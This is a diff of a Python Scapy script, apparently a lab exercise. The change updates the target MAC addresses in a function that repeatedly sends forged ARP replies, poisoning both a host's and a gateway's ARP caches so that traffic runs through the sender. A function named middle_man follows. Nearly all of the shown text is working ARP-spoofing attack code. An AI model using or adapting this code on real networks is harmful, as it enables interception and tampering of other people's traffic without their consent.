@@ -24,14 +24,14 @@ def arp():
 
 	p = []
 	# for i in range(len(vip)):
-	p.append(Ether(dst='08:00:27:f1:c3:95', src=mac)/ARP(pdst='10.0.2.4', psrc='10.0.2.1', 
-		hwdst='08:00:27:f1:c3:95', hwsrc=mac, op=2))
+	p.append(Ether(dst='00:0c:29:e4:f0:86', src=mac)/ARP(pdst='10.0.2.4', psrc='10.0.2.1', 
+		hwdst='00:0c:29:e4:f0:86', hwsrc=mac, op=2))
 	for i in range(10):
 		print('send arp ', i)
-		sendp(Ether(dst='08:00:27:f1:c3:95', src=mac)/ARP(pdst='10.0.2.4', psrc='10.0.2.1', 
-		hwdst='08:00:27:f1:c3:95', hwsrc=mac, op=2))
-		sendp(Ether(dst='52:54:00:12:35:00', src=mac)/ARP(pdst='10.0.2.1', psrc='10.0.2.4', 
-		hwdst='52:54:00:12:35:00', hwsrc=mac, op=2))
+		sendp(Ether(dst='00:0c:29:e4:f0:86', src=mac)/ARP(pdst='10.0.2.4', psrc='10.0.2.1', 
+		hwdst='00:0c:29:e4:f0:86', hwsrc=mac, op=2))
+		sendp(Ether(dst='00:50:56:c0:00:08', src=mac)/ARP(pdst='10.0.2.1', psrc='10.0.2.4', 
+		hwdst='00:50:56:c0:00:08', hwsrc=mac, op=2))
 		time.sleep(0.1)
 
 def middle_man():
